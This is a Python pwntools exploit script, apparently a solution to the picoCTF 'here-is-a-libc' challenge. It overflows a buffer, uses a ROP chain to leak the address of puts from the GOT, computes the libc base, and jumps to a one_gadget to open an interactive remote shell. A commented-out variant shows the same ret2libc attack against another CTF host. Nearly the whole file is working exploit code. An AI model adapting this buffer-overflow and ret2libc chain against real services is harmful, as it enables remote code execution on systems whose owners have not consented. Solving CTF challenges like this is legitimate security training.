from pwn import *

context.binary = elf = context.binary = ELF('here-is-a-libc')
libc = ELF('libc.so.6')

io = remote('mercury.picoctf.net', 49464)
to_fill = 0x80 + 8

rop = ROP(elf)
ret = (rop.find_gadget(['ret']))[0]

# Manual way
print(elf.got)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.symbols['main']
POP_RDI = rop.rdi.address
print(hex(POP_RDI))
payload = b'A' * to_fill + p64(POP_RDI) + p64(puts_got) + p64(puts_plt) + p64(main)  # Manual way: calls puts(printf_got) to leak address of printf in the GOT then return to main to allow input again

# Automatic way
rop.puts(elf.got.puts)
rop.main()
payload = b'A' * to_fill + rop.chain()  # Automatic way using rop chain, both works

io.sendline(payload)
io.recvuntil(b'WeLcOmE To mY EcHo sErVeR!\n')
io.recvline()  # echo output useless
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
print('leak:', hex(leak))

libc_puts_offset = libc.symbols['puts']
libc_system_offset = libc.symbols['system']
BIN_SH_offset_searched = next(libc.search(b"/bin/sh"))
ONE_GADGET = 0x4f3c2  # found using one_gadget libc.so.6
print(hex(BIN_SH_offset_searched))

libc_base = leak - libc_puts_offset
libc_system = libc_base + libc_system_offset
libc_BIN_SH = libc_base + BIN_SH_offset_searched
libc_one_gadget = libc_base + ONE_GADGET
print('system:', hex(libc_system))
print('binsh:', hex(libc_BIN_SH))

# payload = b'A' * to_fill + p64(POP_RDI) + p64(libc_BIN_SH) + p64(ret) + p64(libc_system)  # dont work due to space in payload
payload = b'A' * to_fill + p64(ret) + p64(libc_one_gadget)  # return directly to libc onegadget
io.sendline(payload)
io.interactive()

# alternative way but doesnt work for this (same reason as manual way)
# from pwn import *
#
# p = remote('chals.cyberthon22t.ctf.sg', 20201)
# libc = ELF('libc.so.6')
#
# context.binary = elf = ELF('byos')
#
# rop = ROP(elf)
# rop.puts(elf.sym.printf)
# rop.main()
#
# p.sendline(flat({0x100 + 8: rop.chain()}))
# p.recvuntil(b'Enter Input =>')
# leak = u64(p.recvline().strip().ljust(8, b'\x00'))
#
# log.info(f"leak: {hex(leak)}")
#
# libc.address = leak - libc.sym.printf
# binsh = next(libc.search(b"/bin/sh"))
#
# rop = ROP([libc, elf])
# rop.system(binsh)
#
# p.sendline(flat({0x100 + 8: rop.chain()}))
# p.interactive()
